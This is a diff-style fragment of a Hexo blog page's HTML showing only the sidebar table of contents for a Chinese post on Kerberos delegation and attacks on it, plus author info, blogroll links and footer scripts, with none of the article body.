+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#简单回顾Kerberos认证过程"><span class="nav-number">1.</span> <span class="nav-text">简单回顾Kerberos认证过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#委派的场景"><span class="nav-number">2.</span> <span class="nav-text">委派的场景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#kerberos委派分类"><span class="nav-number">3.</span> <span class="nav-text">kerberos委派分类</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#非约束委派（Unconstrained-delegation）"><span class="nav-number">4.</span> <span class="nav-text">非约束委派（Unconstrained delegation）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#约束委派"><span class="nav-number">5.</span> <span class="nav-text">约束委派</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#传统的约束委派"><span class="nav-number">5.1.</span> <span class="nav-text">传统的约束委派</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基于资源的约束委派"><span class="nav-number">5.2.</span> <span class="nav-text">基于资源的约束委派</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#发现域内配置委派的账户"><span class="nav-number">6.</span> <span class="nav-text">发现域内配置委派的账户</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#环境说明"><span class="nav-number">7.</span> <span class="nav-text">环境说明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击非约束委派"><span class="nav-number">8.</span> <span class="nav-text">攻击非约束委派</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击非约束委派（进阶）"><span class="nav-number">9.</span> <span class="nav-text">攻击非约束委派（进阶）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击约束委派"><span class="nav-number">10.</span> <span class="nav-text">攻击约束委派</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#杂"><span class="nav-number">11.</span> <span class="nav-text">杂</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">12.</span> <span class="nav-text">参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">李三（cl0und）</p>
+  <div class="site-description" itemprop="description">人若无名，便可专心练剑</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://7o8v.me/" title="http:&#x2F;&#x2F;7o8v.me&#x2F;" rel="noopener" target="_blank">7o8v☘️</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://evoa.me/" title="https:&#x2F;&#x2F;evoa.me&#x2F;" rel="noopener" target="_blank">evoA☘️</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://kkdlong.win/" title="http:&#x2F;&#x2F;kkdlong.win&#x2F;" rel="noopener" target="_blank">kkdlong☘️</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.l0ca1.xyz/" title="https:&#x2F;&#x2F;blog.l0ca1.xyz&#x2F;" rel="noopener" target="_blank">l0cal☘️</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.lmxspace.com/" title="http:&#x2F;&#x2F;www.lmxspace.com&#x2F;" rel="noopener" target="_blank">l1nk3r</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/iamstudy/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;iamstudy&#x2F;" rel="noopener" target="_blank">l3m0n☘️</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://8sec.cc/" title="http:&#x2F;&#x2F;8sec.cc&#x2F;" rel="noopener" target="_blank">裤衩哥的小屋</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://abcdefghijklmnopqrst.xyz/" title="http:&#x2F;&#x2F;abcdefghijklmnopqrst.xyz" rel="noopener" target="_blank">骑麦兜看落日☘️</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">李三（cl0und）</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="Symbols count total">153k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">2:19</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.1.1
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> v7.6.0
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
